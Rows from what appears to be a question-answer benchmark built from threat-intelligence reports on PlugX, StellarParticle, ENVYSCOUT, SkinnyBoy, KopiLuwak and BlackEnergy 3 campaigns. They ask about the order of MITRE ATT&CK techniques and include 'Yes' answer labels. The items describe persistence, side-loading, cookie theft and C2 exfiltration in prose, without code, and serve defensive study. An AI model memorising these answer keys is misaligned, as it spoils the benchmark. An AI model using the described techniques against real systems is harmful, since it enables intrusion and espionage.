1952,344,344-Persistence-T1547-Boot or Logon Autostart Execution,"After PlugX malware executes by importing a malicious DLL that loads, decrypts, and executes an encrypted payload file, is it likely to establish persistence on the host by setting a registry Run key before executing the copy of the legitimate file under ProgramData with a command-line argument?","Persistence: PlugX establishes persistence on the host by setting a registry Run key. The running instance of the PlugX payload executes the copy of the legitimate file under ProgramData, passing it a command-line argument before exiting. The legitimate file then imports the malicious DLL in the same folder, loading, decoding, and passing execution to the malicious payload file.","Initial Access: In June and July 2022, Secureworks Counter Threat Unit researchers identified a campaign targeting government officials' computers in Europe, the Middle East, and South America. The threat group BRONZE PRESIDENT used phishing emails to deliver RAR archive files containing a Windows shortcut (LNK) file that masqueraded as a document. The shortcut executed a renamed legitimate file contained in a hidden folder structure designed to bypass mail-scanning products.
Execution: The malware, identified as PlugX, is modular and contacts a command and control (C2) server for tasking. It can download additional plugins to enhance its capabilities beyond basic information gathering. The malware executes by importing a malicious DLL that loads, decrypts, and executes an encrypted payload file. The payload drops a decoy document to the user's %Temp% directory and copies three files to a ProgramData subdirectory using a specific naming scheme. The legitimate file is named with its usual name (e.g., Opera.exe, AdobePlugin.exe, AvastBrowser.exe).
Defense Evasion: The malicious DLLs and payloads are heavily obfuscated to hinder analysis and reduce the likelihood of detection by host-based security software. The malicious DLL executes its payload using an unusual technique, involving EnumThreadWindows to pass execution to the start of the malicious payload file. The payload file is treated as executable code, similar to a Cobalt Strike stageless payload artifact, which may increase the likelihood of the malware being misidentified.
Command and Control: The PlugX payload communicates with a C2 server and executes the copy of the legitimate file under ProgramData with a command-line argument. The payload file checks the number of arguments and, if an additional argument follows the file path, it opens the decoy document previously dropped to the user's %Temp% folder and continues execution with its C2 routine.
Others: The BRONZE PRESIDENT threat group is likely Chinese government-sponsored and has been observed targeting government officials with politically-themed decoy documents that align with regions where China has interests. The group targets China's neighbors such as Myanmar and Vietnam, and its collection requirements can change quickly, often driven by geopolitical events such as the war in Ukraine. Organizations in regions of interest to China, especially those associated with or operating as government agencies, should closely monitor this group's activities. Secureworks provides indicators for this threat in Table 2 and recommends using available controls to review and restrict access based on these indicators.",Yes,BRONZE PRESIDENT Targets Government Officials _ Secureworks
1954,344,344-Command and Control-T1071-Application Layer Protocol,"After leveraging heavily obfuscated malicious DLLs for defense evasion by executing payloads using EnumThreadWindows, is PlugX malware likely to communicate with a C2 server using an application layer protocol before continuing its execution by opening a decoy document dropped in the %Temp% folder?","Command and Control: The PlugX payload communicates with a C2 server and executes the copy of the legitimate file under ProgramData with a command-line argument. The payload file checks the number of arguments and, if an additional argument follows the file path, it opens the decoy document previously dropped to the user's %Temp% folder and continues execution with its C2 routine.","Initial Access: In June and July 2022, Secureworks Counter Threat Unit researchers identified a campaign targeting government officials' computers in Europe, the Middle East, and South America. The threat group BRONZE PRESIDENT used phishing emails to deliver RAR archive files containing a Windows shortcut (LNK) file that masqueraded as a document. The shortcut executed a renamed legitimate file contained in a hidden folder structure designed to bypass mail-scanning products.
Execution: The malware, identified as PlugX, is modular and contacts a command and control (C2) server for tasking. It can download additional plugins to enhance its capabilities beyond basic information gathering. The malware executes by importing a malicious DLL that loads, decrypts, and executes an encrypted payload file. The payload drops a decoy document to the user's %Temp% directory and copies three files to a ProgramData subdirectory using a specific naming scheme. The legitimate file is named with its usual name (e.g., Opera.exe, AdobePlugin.exe, AvastBrowser.exe).
Persistence: PlugX establishes persistence on the host by setting a registry Run key. The running instance of the PlugX payload executes the copy of the legitimate file under ProgramData, passing it a command-line argument before exiting. The legitimate file then imports the malicious DLL in the same folder, loading, decoding, and passing execution to the malicious payload file.
Defense Evasion: The malicious DLLs and payloads are heavily obfuscated to hinder analysis and reduce the likelihood of detection by host-based security software. The malicious DLL executes its payload using an unusual technique, involving EnumThreadWindows to pass execution to the start of the malicious payload file. The payload file is treated as executable code, similar to a Cobalt Strike stageless payload artifact, which may increase the likelihood of the malware being misidentified.
Others: The BRONZE PRESIDENT threat group is likely Chinese government-sponsored and has been observed targeting government officials with politically-themed decoy documents that align with regions where China has interests. The group targets China's neighbors such as Myanmar and Vietnam, and its collection requirements can change quickly, often driven by geopolitical events such as the war in Ukraine. Organizations in regions of interest to China, especially those associated with or operating as government agencies, should closely monitor this group's activities. Secureworks provides indicators for this threat in Table 2 and recommends using available controls to review and restrict access based on these indicators.",Yes,BRONZE PRESIDENT Targets Government Officials _ Secureworks
1962,345,345-Credential Access-T1539-Steal Web Session Cookie,"After utilizing credential hopping and configuring malware such as TrailBlazer for WMI persistence, is it likely that the StellarParticle campaign will steal web session cookies from end-user workstations before using web session cookies in credential access techniques to access cloud resources?",Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.,"Initial Access: The StellarParticle campaign, associated with COZY BEAR, utilized various initial access techniques. They gained access to the victim's network by logging into a public-facing system via Secure Shell (SSH) using a local account acquired during previous credential theft activities. They also used port forwarding capabilities to establish a Remote Desktop Protocol (RDP) session to internal servers using different domain accounts. Additionally, the threat actor used VPNs to gain access to systems and persist in the environment. They exported saved passwords from users' Chrome browser installations.
Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.
Collection: The threat actor accessed data from Information Repositories.",Yes,APT29_StellarParticle-Campaing_CrowdStrike
1966,345,345-Lateral Movement-T1021-Remote Services,"After accessing data from Information Repositories during the Collection phase, is it likely that the StellarParticle threat actor will use privileged and non-privileged accounts through RDP for Lateral Movement before they configure TrailBlazer malware for WMI persistence in the Persistence phase?","Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.","Initial Access: The StellarParticle campaign, associated with COZY BEAR, utilized various initial access techniques. They gained access to the victim's network by logging into a public-facing system via Secure Shell (SSH) using a local account acquired during previous credential theft activities. They also used port forwarding capabilities to establish a Remote Desktop Protocol (RDP) session to internal servers using different domain accounts. Additionally, the threat actor used VPNs to gain access to systems and persist in the environment. They exported saved passwords from users' Chrome browser installations.
Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Collection: The threat actor accessed data from Information Repositories.",Yes,APT29_StellarParticle-Campaing_CrowdStrike
1967,345,345-Collection-T1213-Data from Information Repositories,"After the StellarParticle campaign demonstrated discovery activities using AdFind and custom PowerShell cmdlets to identify Active Directory information, is it likely that the threat actor used both privileged and non-privileged accounts for RDP to move laterally through the environment before accessing data from Information Repositories?",Collection: The threat actor accessed data from Information Repositories.,"Initial Access: The StellarParticle campaign, associated with COZY BEAR, utilized various initial access techniques. They gained access to the victim's network by logging into a public-facing system via Secure Shell (SSH) using a local account acquired during previous credential theft activities. They also used port forwarding capabilities to establish a Remote Desktop Protocol (RDP) session to internal servers using different domain accounts. Additionally, the threat actor used VPNs to gain access to systems and persist in the environment. They exported saved passwords from users' Chrome browser installations.
Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.",Yes,APT29_StellarParticle-Campaing_CrowdStrike
1979,349,349-Initial Access-T1566-Phishing,"After developing VPS infrastructure to host malware C2s by using compromised webservers to host ENVYSCOUT delivery scripts, is it likely that the adversary will send emails with a diplomatic-themed PDF attachment containing a link to ENVYSCOUT in order to gain initial access?",Initial Access: Initial Access T1566 T1566.001  The adversary sent emails that used diplomatic themes Phishing Spearphishing Attachment The adversary sent emails with a PDF attachment.  The PDF contained a link to ENVYSCOUT,"Resource Development: Resource Development T1583.003 T1584  Virtual Private Server Compromise Infrastructure The adversary used compromised webservers to host ENVYSCOUT delivery scripts  The adversary used VPSs to host malware C2s
Execution: Execution T1204  User Execution  T1204.002  Malicious File  The adversary relies on tricking users into executing malware The adversary used malicious DLL DLL Hijacking to execute malware loaded via
Persistence: Persistence T1547.001  T1574.001  Registry Run Keys Startup Folder DLL Search Order Hijacking  T1574.002  DLL Side-Loading  The adversary used the Run registry key to maintain persistence The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL
Defense Evasion: Defense Evasion T1027.006  HTML Smuggling  T1140  T1553.005  Deobfuscate/Decode Files or Information Mark-of-the-Web Bypass  T1574.001  DLL Search Order Hijacking  T1574.002  DLL Side-Loading  ENVYSCOUT delivery script uses HTML Smuggling to bypass security controls The adversary uses obfuscation to protect sensitive information (i.e. strings). The adversary abuses container files such as ISO to deliver malicious payloads that are not tagged with MOTW The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL",Yes,HALFRIG_
1983,349,349-Persistence-T1574-Hijack Execution Flow,"After relying on compromised webservers for hosting ENVYSCOUT delivery scripts and hosting malware C2s using virtual private servers, is it likely that the adversary will trick users into executing malicious DLLs via DLL Hijacking before using the Run registry key or planting legitimate binaries to maintain persistence?",Persistence: Persistence T1547.001  T1574.001  Registry Run Keys Startup Folder DLL Search Order Hijacking  T1574.002  DLL Side-Loading  The adversary used the Run registry key to maintain persistence The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL,"Resource Development: Resource Development T1583.003 T1584  Virtual Private Server Compromise Infrastructure The adversary used compromised webservers to host ENVYSCOUT delivery scripts  The adversary used VPSs to host malware C2s
Initial Access: Initial Access T1566 T1566.001  The adversary sent emails that used diplomatic themes Phishing Spearphishing Attachment The adversary sent emails with a PDF attachment.  The PDF contained a link to ENVYSCOUT
Execution: Execution T1204  User Execution  T1204.002  Malicious File  The adversary relies on tricking users into executing malware The adversary used malicious DLL DLL Hijacking to execute malware loaded via
Defense Evasion: Defense Evasion T1027.006  HTML Smuggling  T1140  T1553.005  Deobfuscate/Decode Files or Information Mark-of-the-Web Bypass  T1574.001  DLL Search Order Hijacking  T1574.002  DLL Side-Loading  ENVYSCOUT delivery script uses HTML Smuggling to bypass security controls The adversary uses obfuscation to protect sensitive information (i.e. strings). The adversary abuses container files such as ISO to deliver malicious payloads that are not tagged with MOTW The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL",Yes,HALFRIG_
1984,349,349-Defense Evasion-T1027-Obfuscated Files or Information,"After the adversary achieves persistence by using the Run registry key and planting a copy of a legitimate binary that loads a malicious DLL, is it likely that the adversary's ENVYSCOUT delivery script will use HTML Smuggling and obfuscation techniques for defense evasion?",Defense Evasion: Defense Evasion T1027.006  HTML Smuggling  T1140  T1553.005  Deobfuscate/Decode Files or Information Mark-of-the-Web Bypass  T1574.001  DLL Search Order Hijacking  T1574.002  DLL Side-Loading  ENVYSCOUT delivery script uses HTML Smuggling to bypass security controls The adversary uses obfuscation to protect sensitive information (i.e. strings). The adversary abuses container files such as ISO to deliver malicious payloads that are not tagged with MOTW The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL,"Resource Development: Resource Development T1583.003 T1584  Virtual Private Server Compromise Infrastructure The adversary used compromised webservers to host ENVYSCOUT delivery scripts  The adversary used VPSs to host malware C2s
Initial Access: Initial Access T1566 T1566.001  The adversary sent emails that used diplomatic themes Phishing Spearphishing Attachment The adversary sent emails with a PDF attachment.  The PDF contained a link to ENVYSCOUT
Execution: Execution T1204  User Execution  T1204.002  Malicious File  The adversary relies on tricking users into executing malware The adversary used malicious DLL DLL Hijacking to execute malware loaded via
Persistence: Persistence T1547.001  T1574.001  Registry Run Keys Startup Folder DLL Search Order Hijacking  T1574.002  DLL Side-Loading  The adversary used the Run registry key to maintain persistence The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL",Yes,HALFRIG_
1985,349,349-Defense Evasion-T1140-Deobfuscate/Decode Files or Information,"After the adversary used spearphishing emails with a PDF attachment that linked to ENVYSCOUT to gain initial access, is it likely that the adversary will execute malware via user execution of a malicious DLL before using obfuscation techniques to protect sensitive information?",Defense Evasion: Defense Evasion T1027.006  HTML Smuggling  T1140  T1553.005  Deobfuscate/Decode Files or Information Mark-of-the-Web Bypass  T1574.001  DLL Search Order Hijacking  T1574.002  DLL Side-Loading  ENVYSCOUT delivery script uses HTML Smuggling to bypass security controls The adversary uses obfuscation to protect sensitive information (i.e. strings). The adversary abuses container files such as ISO to deliver malicious payloads that are not tagged with MOTW The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL,"Resource Development: Resource Development T1583.003 T1584  Virtual Private Server Compromise Infrastructure The adversary used compromised webservers to host ENVYSCOUT delivery scripts  The adversary used VPSs to host malware C2s
Initial Access: Initial Access T1566 T1566.001  The adversary sent emails that used diplomatic themes Phishing Spearphishing Attachment The adversary sent emails with a PDF attachment.  The PDF contained a link to ENVYSCOUT
Execution: Execution T1204  User Execution  T1204.002  Malicious File  The adversary relies on tricking users into executing malware The adversary used malicious DLL DLL Hijacking to execute malware loaded via
Persistence: Persistence T1547.001  T1574.001  Registry Run Keys Startup Folder DLL Search Order Hijacking  T1574.002  DLL Side-Loading  The adversary used the Run registry key to maintain persistence The adversary used malicious DLL loaded via DLL Hijacking into a process created from a legitimate binary to execute malware The adversary maintains persistence by planting a copy of a legitimate binary that loads malicious DLL",Yes,HALFRIG_
1988,35,35-Command and Control-T1071-Application Layer Protocol,"Before SkinnyBoy communicates with the C2 server updaterweb[.]com as part of the command and control process using an HTTP POST request, is it likely to have collected data by base64 encoding the output of system-related commands and directory content using the CryptBinaryToStringA API?","Command and Control: The malware communicates with the C2 server updaterweb[.]com, sending exfiltrated data in a POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"". It also downloads a DLL file from the C2 server, which is loaded using the LoadLibraryW API, and executes the first ordinal function.","Execution: The SkinnyBoy malware, attributed to APT28/Sofacy, executes by creating an unnamed event object and two new threads. It uses the GetMessage routine to process messages and breaks the loop if the message is WM_ENDSESSION. The malware creates an anonymous pipe and uses GetStartupInfoA to retrieve the STARTUPINFO structure. It then creates a new process to run the systeminfo command, using the pipe for inter-process communication. The output is read via ReadFile. Similarly, it retrieves the list of processes by running the tasklist command and reading the output.
Defense Evasion: SkinnyBoy employs defense evasion by using the GetTempPathW API to retrieve the path of the %TEMP% directory and initializing the use of WinINet functions with the InternetOpenW API, setting the user agent to ""Opera"". It sets send and receive timeouts to 600 seconds using InternetSetOptionW. The malware establishes a connection to the C2 server updaterweb[.]com on port 443, and if it fails, it tries port 80. It uses the HttpOpenRequestW routine to create an HTTP POST request handle and adds an HTTP request header.
Discovery: SkinnyBoy conducts discovery by enumerating files and directories from the Desktop directory using FindFirstFileW and FindNextFileW functions. It targets directories such as 'C:\Program Files', 'C:\Program Files (x86)', and various user-specific AppData folders. The SHGetFolderPathW function is used to obtain folder names, and the GetComputerNameA and GetUserNameA APIs are used to retrieve the NetBIOS name of the local computer and the name of the user associated with the current thread, respectively. The malware also extracts the volume serial number of the root directory using GetVolumeInformationW.
Collection: SkinnyBoy collects data by base64 encoding the output of the systeminfo and tasklist commands, along with the list of targeted directories and their content, using the CryptBinaryToStringA API.
Exfiltration: SkinnyBoy exfiltrates collected information to the C2 server updaterweb[.]com using an HTTP POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"".
Others: The malware uses the CryptAcquireContextA function to acquire a handle to the Microsoft RSA and AES Cryptographic Provider and the CryptCreateHash routine to create a hash object. It verifies the hash value of a downloaded DLL file against a provided buffer. The malware creates a file called fvjoik.dll in the %TEMP% directory, populates it with the DLL downloaded from the C2 server, and executes an exported function with ordinal 1. After execution, it uses WinExec to delete the DLL file. The main thread retrieves the termination status of the two threads using the GetExitCodeThread API.",Yes,A step-by-step analysis of the new malware used by APT28_Sofacy called SkinnyBoy – CYBER GEEKS
1989,35,35-Command and Control-T1132-Data Encoding,"After collecting base64-encoded outputs from the systeminfo and tasklist commands along with enumerated directory content, is SkinnyBoy likely to communicate with the C2 server updaterweb[.]com to send exfiltrated data using an HTTP POST request?","Command and Control: The malware communicates with the C2 server updaterweb[.]com, sending exfiltrated data in a POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"". It also downloads a DLL file from the C2 server, which is loaded using the LoadLibraryW API, and executes the first ordinal function.","Execution: The SkinnyBoy malware, attributed to APT28/Sofacy, executes by creating an unnamed event object and two new threads. It uses the GetMessage routine to process messages and breaks the loop if the message is WM_ENDSESSION. The malware creates an anonymous pipe and uses GetStartupInfoA to retrieve the STARTUPINFO structure. It then creates a new process to run the systeminfo command, using the pipe for inter-process communication. The output is read via ReadFile. Similarly, it retrieves the list of processes by running the tasklist command and reading the output.
Defense Evasion: SkinnyBoy employs defense evasion by using the GetTempPathW API to retrieve the path of the %TEMP% directory and initializing the use of WinINet functions with the InternetOpenW API, setting the user agent to ""Opera"". It sets send and receive timeouts to 600 seconds using InternetSetOptionW. The malware establishes a connection to the C2 server updaterweb[.]com on port 443, and if it fails, it tries port 80. It uses the HttpOpenRequestW routine to create an HTTP POST request handle and adds an HTTP request header.
Discovery: SkinnyBoy conducts discovery by enumerating files and directories from the Desktop directory using FindFirstFileW and FindNextFileW functions. It targets directories such as 'C:\Program Files', 'C:\Program Files (x86)', and various user-specific AppData folders. The SHGetFolderPathW function is used to obtain folder names, and the GetComputerNameA and GetUserNameA APIs are used to retrieve the NetBIOS name of the local computer and the name of the user associated with the current thread, respectively. The malware also extracts the volume serial number of the root directory using GetVolumeInformationW.
Collection: SkinnyBoy collects data by base64 encoding the output of the systeminfo and tasklist commands, along with the list of targeted directories and their content, using the CryptBinaryToStringA API.
Exfiltration: SkinnyBoy exfiltrates collected information to the C2 server updaterweb[.]com using an HTTP POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"".
Others: The malware uses the CryptAcquireContextA function to acquire a handle to the Microsoft RSA and AES Cryptographic Provider and the CryptCreateHash routine to create a hash object. It verifies the hash value of a downloaded DLL file against a provided buffer. The malware creates a file called fvjoik.dll in the %TEMP% directory, populates it with the DLL downloaded from the C2 server, and executes an exported function with ordinal 1. After execution, it uses WinExec to delete the DLL file. The main thread retrieves the termination status of the two threads using the GetExitCodeThread API.",Yes,A step-by-step analysis of the new malware used by APT28_Sofacy called SkinnyBoy – CYBER GEEKS
1996,35,35-Exfiltration-T1041-Exfiltration Over C2 Channel,"After SkinnyBoy conducts command and control by sending exfiltrated data and downloading a DLL file from the C2 server with the structure including host, username, serial number, and data, is it likely that SkinnyBoy will exfiltrate the collected information to updaterweb[.]com using an HTTP POST request?","Exfiltration: SkinnyBoy exfiltrates collected information to the C2 server updaterweb[.]com using an HTTP POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"".","Execution: The SkinnyBoy malware, attributed to APT28/Sofacy, executes by creating an unnamed event object and two new threads. It uses the GetMessage routine to process messages and breaks the loop if the message is WM_ENDSESSION. The malware creates an anonymous pipe and uses GetStartupInfoA to retrieve the STARTUPINFO structure. It then creates a new process to run the systeminfo command, using the pipe for inter-process communication. The output is read via ReadFile. Similarly, it retrieves the list of processes by running the tasklist command and reading the output.
Defense Evasion: SkinnyBoy employs defense evasion by using the GetTempPathW API to retrieve the path of the %TEMP% directory and initializing the use of WinINet functions with the InternetOpenW API, setting the user agent to ""Opera"". It sets send and receive timeouts to 600 seconds using InternetSetOptionW. The malware establishes a connection to the C2 server updaterweb[.]com on port 443, and if it fails, it tries port 80. It uses the HttpOpenRequestW routine to create an HTTP POST request handle and adds an HTTP request header.
Discovery: SkinnyBoy conducts discovery by enumerating files and directories from the Desktop directory using FindFirstFileW and FindNextFileW functions. It targets directories such as 'C:\Program Files', 'C:\Program Files (x86)', and various user-specific AppData folders. The SHGetFolderPathW function is used to obtain folder names, and the GetComputerNameA and GetUserNameA APIs are used to retrieve the NetBIOS name of the local computer and the name of the user associated with the current thread, respectively. The malware also extracts the volume serial number of the root directory using GetVolumeInformationW.
Collection: SkinnyBoy collects data by base64 encoding the output of the systeminfo and tasklist commands, along with the list of targeted directories and their content, using the CryptBinaryToStringA API.
Command and Control: The malware communicates with the C2 server updaterweb[.]com, sending exfiltrated data in a POST request with the structure ""id=<hostname>#Username#<Serial number in decimal>&current=1&total=1&data=<base-64 encoded data>"". It also downloads a DLL file from the C2 server, which is loaded using the LoadLibraryW API, and executes the first ordinal function.
Others: The malware uses the CryptAcquireContextA function to acquire a handle to the Microsoft RSA and AES Cryptographic Provider and the CryptCreateHash routine to create a hash object. It verifies the hash value of a downloaded DLL file against a provided buffer. The malware creates a file called fvjoik.dll in the %TEMP% directory, populates it with the DLL downloaded from the C2 server, and executes an exported function with ordinal 1. After execution, it uses WinExec to delete the DLL file. The main thread retrieves the termination status of the two threads using the GetExitCodeThread API.",Yes,A step-by-step analysis of the new malware used by APT28_Sofacy called SkinnyBoy – CYBER GEEKS
1998,350,350-Persistence-T1053-Scheduled Task/Job,"After Scr.js fingerprints the infected system and performs discovery tasks by executing various commands and saving the output to a temporary file, is it likely that the file Scr.js will drop the scheduled task PolicyConverter for persistence before the task PolicyConverter executes the file appidpolicyconverter.js containing the KopiLuwak backdoor code?","Persistence: The JavaScript dropper, Scr.js, creates a scheduled task named PolicyConverter for persistence, set to run every 10 minutes. This task executes the JS backdoor decryptor, appidpolicyconverter.js, which contains the KopiLuwak backdoor code.","Initial Access: The Turla APT group used a .NET/MSIL dropper to deliver the JS/KopiLuwak backdoor. The dropper, disguised as an invitation to a G20 task force meeting, was first observed in mid-July. The decoy document, potentially stolen, suggests targeting of G20 participants or those interested in the G20 Digital Economy event.
Execution: Upon execution, the MSIL dropper deploys a PDF decoy and a JavaScript dropper. The JavaScript dropper installs a JS decryptor, which then decrypts and executes the KopiLuwak backdoor in memory. The dropper, named Runer.exe, contains no obfuscation and writes the Stage1 JS and decoy PDF to %APPDATA% for execution.
Defense Evasion: The KopiLuwak MSIL dropper lacks obfuscation or anti-analysis features. The JavaScript dropper Scr.js fingerprints the infected system and sets up persistence without raising suspicion. The backdoor communicates with compromised legitimate websites, and the HTTP User-Agent is now hardcoded, differing from previous variants.
Discovery: Scr.js fingerprints the infected system by executing various commands and saving the output to a temporary file. The commands include checking for Kaspersky Lab directories and performing a traceroute to www.google.com.
Command and Control: The KopiLuwak backdoor communicates with two compromised legitimate websites using HTTP POST requests. The backdoor can receive commands from the C&C, including exfiltrating data, downloading files, and executing arbitrary commands.
Exfiltration: The updated KopiLuwak backdoor can exfiltrate files to the C&C and download files to the infected machine. It supports commands for exfiltrating content and saving provided content to the infected machine.
Others: Proofpoint researchers have not observed the attack in the wild but note the potential high impact for PCs running the .NET framework. The Turla APT group is believed to be Russian state-sponsored and has been involved in various cyber espionage activities. The researchers will continue to monitor the actor and the new tools.",Yes,Turla_APT
2004,350,350-Exfiltration-T1041-Exfiltration Over C2 Channel,"After communicating with two compromised legitimate websites using HTTP POST requests, is the KopiLuwak backdoor likely to exfiltrate files to the C2 server while also being able to download files to the infected machine?",Exfiltration: The updated KopiLuwak backdoor can exfiltrate files to the C&C and download files to the infected machine. It supports commands for exfiltrating content and saving provided content to the infected machine.,"Initial Access: The Turla APT group used a .NET/MSIL dropper to deliver the JS/KopiLuwak backdoor. The dropper, disguised as an invitation to a G20 task force meeting, was first observed in mid-July. The decoy document, potentially stolen, suggests targeting of G20 participants or those interested in the G20 Digital Economy event.
Execution: Upon execution, the MSIL dropper deploys a PDF decoy and a JavaScript dropper. The JavaScript dropper installs a JS decryptor, which then decrypts and executes the KopiLuwak backdoor in memory. The dropper, named Runer.exe, contains no obfuscation and writes the Stage1 JS and decoy PDF to %APPDATA% for execution.
Persistence: The JavaScript dropper, Scr.js, creates a scheduled task named PolicyConverter for persistence, set to run every 10 minutes. This task executes the JS backdoor decryptor, appidpolicyconverter.js, which contains the KopiLuwak backdoor code.
Defense Evasion: The KopiLuwak MSIL dropper lacks obfuscation or anti-analysis features. The JavaScript dropper Scr.js fingerprints the infected system and sets up persistence without raising suspicion. The backdoor communicates with compromised legitimate websites, and the HTTP User-Agent is now hardcoded, differing from previous variants.
Discovery: Scr.js fingerprints the infected system by executing various commands and saving the output to a temporary file. The commands include checking for Kaspersky Lab directories and performing a traceroute to www.google.com.
Command and Control: The KopiLuwak backdoor communicates with two compromised legitimate websites using HTTP POST requests. The backdoor can receive commands from the C&C, including exfiltrating data, downloading files, and executing arbitrary commands.
Others: Proofpoint researchers have not observed the attack in the wild but note the potential high impact for PCs running the .NET framework. The Turla APT group is believed to be Russian state-sponsored and has been involved in various cyber espionage activities. The researchers will continue to monitor the actor and the new tools.",Yes,Turla_APT
2007,351,351-Execution-T1204-User Execution,"After performing a phishing campaign to deliver the BlackEnergy 3 RAT to target systems, is it likely that the adversaries will establish a Command and Control (C2) connection through malicious VBA script execution to enable further malicious activities?","Execution: Step 4: Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Employee-enabled malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: In a social engineering attack, employees are prompted to enable macros when opening the file attached to phishing email. Once macros are enabled, the VBA script places multiple malicious files on the workstation, unbeknown to the employee. Impact: Files placed on workstations within the corporate network can begin the communication process with external Command and Control (CC) servers.","Reconnaissance: Step 1: Reconnaissance and Intelligence Gathering. Before the attack, adversaries likely begin open-source intelligence gathering and reconnaissance on potential targets. Location: External infrastructure Action: Active threat actor activity Timeline: May 2014 or earlier Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: Adversaries likely gather publicly available information on deployed systems and network architecture, and may also use active discovery methods such as scanning of perimeter devices, enumeration of devices, social media data collection and analysis for future targeting
Initial Access: Step 3: Deliver Remote Access Trojan (RAT) Adversaries initiate phishing campaign against electricity distributors. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Active threat actor activity Timeline: May 2014-June 2015e Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other IT services used in business operations. Exploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to users on targeted networks. Impact: RAT is delivered to targeted network, but not installed. Installation requires employees to actively grant permission to the embedded VBA scripts to execute.
